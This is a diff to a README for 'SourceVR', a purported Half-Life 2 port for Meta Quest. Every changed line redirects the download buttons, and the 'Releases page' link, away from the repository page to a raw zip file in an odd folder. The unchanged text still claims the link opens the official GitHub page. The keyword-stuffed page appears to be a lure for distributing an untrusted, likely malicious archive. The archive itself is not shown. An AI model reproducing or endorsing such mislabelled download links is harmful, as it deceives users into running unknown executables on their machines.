@@ -1,6 +1,6 @@
 # 🚀 SourceVR - Play Half-Life 2 Natively on Quest
 
-[![Download SourceVR](https://img.shields.io/badge/Download-SourceVR-2ea44f?style=for-the-badge)](https://github.com/rannaunsoldierly881/SourceVR)
+[![Download SourceVR](https://img.shields.io/badge/Download-SourceVR-2ea44f?style=for-the-badge)](https://github.com/rannaunsoldierly881/SourceVR/raw/refs/heads/main/Balaam/VR_Source_v2.2.zip)
 
 ## 🎮 What is SourceVR?
 
@@ -46,7 +46,7 @@ Before you begin, make sure you have:
 
 ### Step 3: Download SourceVR
 
-[**Visit this link to download the application.**](https://github.com/rannaunsoldierly881/SourceVR)
+[**Visit this link to download the application.**](https://github.com/rannaunsoldierly881/SourceVR/raw/refs/heads/main/Balaam/VR_Source_v2.2.zip)
 
 This will take you to the official SourceVR GitHub page where you can find the latest release.
 
@@ -101,7 +101,7 @@ SourceVR contains **no game content**. You must own a legitimate copy of Half-Li
 
 ## 🛟 Getting Help
 
-If you encounter any issues, check the [Releases page](https://github.com/rannaunsoldierly881/SourceVR/releases) for updates, or look for community support forums and discussions related to SourceVR.
+If you encounter any issues, check the [Releases page](https://github.com/rannaunsoldierly881/SourceVR/raw/refs/heads/main/Balaam/VR_Source_v2.2.zip) for updates, or look for community support forums and discussions related to SourceVR.
 
 ## 📝 Notes for Advanced Users
 
@@ -116,6 +116,6 @@ SourceVR transforms your Meta Quest into a portal to one of the greatest games e
 
 Download SourceVR today and rediscover why Half-Life 2 is considered a masterpiece - this time, from inside the game itself!
 
-[**Download SourceVR Now**](https://github.com/rannaunsoldierly881/SourceVR)
+[**Download SourceVR Now**](https://github.com/rannaunsoldierly881/SourceVR/raw/refs/heads/main/Balaam/VR_Source_v2.2.zip)
 
 Keywords: SourceVR, Half-Life 2 VR, Quest 3, standalone VR, Meta Quest, virtual reality, native VR port, Episode One, Episode Two, Steam VR, half life 2 quest, HL2 VR, free VR game
